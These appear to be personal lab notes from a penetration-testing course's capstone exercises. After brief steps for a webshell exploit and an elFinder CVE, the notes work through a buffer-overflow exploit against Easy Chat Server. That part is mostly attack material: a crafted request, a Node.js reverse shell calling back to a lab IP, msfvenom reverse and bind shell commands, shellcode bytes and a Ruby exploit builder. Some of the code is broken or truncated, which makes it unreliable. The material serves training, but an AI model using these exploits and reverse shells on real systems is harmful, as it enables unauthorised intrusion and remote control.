#### Capstone Exercises








//// Capstone 1 ////
searchsploit 44976.py
edit the exploit to allow the correct path, as well as use print for debug purposes.
obtain webshell from exploit

//// Capstone 2 ////
nmap 192.168.239.46 -sV

22/tcp   open  ssh           OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.25 ((Debian))
3389/tcp open  ms-wbt-server xrdp

bruteforce directories for api endpoints
and directories

Found a directory


This version of elFinder is vulnerable to CVE-2019-9194.

///// Capstone 3 /////

Windows Memory Corruption Vuln

Service Enumeration

Command
nmap 192.168.239.213 -sV -vv

Results
PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
20000/tcp open  http          syn-ack Easy Chat Server httpd 1.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Initial Foothold

searchsploit found a msf exploit. The exploit sends a payload to the
chat.ghp?username= and the password= parameters.

The exploit is crafted like so:
GET <IP>/chat.ghp?username=[$]&password=[$]&room=1&sex=2 HTTP/1.0

The payload is like so:

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1\xeb\x06\x90\x90[[target pack]]/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90[[payload]]/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90/x90

target pack: 0x1001b9a2

payload: (function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(666, "192.168.45.239", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();

payload 2:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.239 LPORT=666 EXITFUNC=thread -f ruby â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20"



ruby

payload= 
"\xda\xdb\xbf\xbf\x9b\x88\xa3\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x52\x83\xea\xfc\x31\x7a\x13\x03\xc5\x88\x6a\x56\xc5" +
"\x47\xe8\x99\x35\x98\x8d\x10\xd0\xa9\x8d\x47\x91\x9a\x3d" +
"\x03\xf7\x16\xb5\x41\xe3\xad\xbb\x4d\x04\x05\x71\xa8\x2b" +
"\x96\x2a\x88\x2a\x14\x31\xdd\x8c\x25\xfa\x10\xcd\x62\xe7" +
"\xd9\x9f\x3b\x63\x4f\x0f\x4f\x39\x4c\xa4\x03\xaf\xd4\x59" +
"\xd3\xce\xf5\xcc\x6f\x89\xd5\xef\xbc\xa1\x5f\xf7\xa1\x8c" +
"\x16\x8c\x12\x7a\xa9\x44\x6b\x83\x06\xa9\x43\x76\x56\xee" +
"\x64\x69\x2d\x06\x97\x14\x36\xdd\xe5\xc2\xb3\xc5\x4e\x80" +
"\x64\x21\x6e\x45\xf2\xa2\x7c\x22\x70\xec\x60\xb5\x55\x87" +
"\x9d\x3e\x58\x47\x14\x04\x7f\x43\x7c\xde\x1e\xd2\xd8\xb1" +
"\x1f\x04\x83\x6e\xba\x4f\x2e\x7a\xb7\x12\x27\x4f\xfa\xac" +
"\xb7\xc7\x8d\xdf\x85\x48\x26\x77\xa6\x01\xe0\x80\xc9\x3b" +
"\x54\x1e\x34\xc4\xa5\x37\xf3\x90\xf5\x2f\xd2\x98\x9d\xaf" +
"\xdb\x4c\x31\xff\x73\x3f\xf2\xaf\x33\xef\x9a\xa5\xbb\xd0" +
"\xbb\xc6\x11\x79\x51\x3d\xf2\x46\x0e\x10\xed\x2f\x4d\x6a" +
"\xf3\x35\xd8\x8c\x99\x59\x8d\x07\x36\xc3\x94\xd3\xa7\x0c" +
"\x03\x9e\xe8\x87\xa0\x5f\xa6\x6f\xcc\x73\x5f\x80\x9b\x29" +
"\xf6\x9f\x31\x45\x94\x32\xde\x95\xd3\x2e\x49\xc2\xb4\x81" +
"\x80\x86\x28\xbb\x3a\xb4\xb0\x5d\x04\x7c\x6f\x9e\x8b\x7d" +
"\xe2\x9a\xaf\x6d\x3a\x22\xf4\xd9\x92\x75\xa2\xb7\x54\x2c" +
"\x04\x61\x0f\x83\xce\xe5\xd6\xef\xd0\x73\xd7\x25\xa7\x9b" +
"\x66\x90\xfe\xa4\x47\x74\xf7\xdd\xb5\xe4\xf8\x34\x7e\x04" +
"\x1b\x9c\x8b\xad\x82\x75\x36\xb0\x34\xa0\x75\xcd\xb6\x40" +
"\x06\x2a\xa6\x21\x03\x76\x60\xda\x79\xe7\x05\xdc\x2e\x08" +
"\x0c"


                        sploit = ...rand_text_alphanumeric(216)...
                        sploit << "\xeb\x06\x90\x90"            # short jump 6 bytes
                        sploit << "0x1001b9a2".pack('V')      #ppr universal
                        sploit << "\x90" * 20                # nop sled
                        sploit << payload.encoded            #payload \xcc\xcc\xcc\xcc>
                        sploit << "\x90" * 20
                        request= 'chat.ghp?username=' +sploit+ '&password=' +sploit+ '>
                        send = "curl -X GET 192.168.:20000/" + request + " HTTP/1.0"
                        
                        File.open(easy-chat.sh, 'w') { |file| file.write(send) }
                        
                        
                        Then I tried:
                        
                       msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00\x20' -f python -v shellcode -o shellcode 

                      
                        
                       



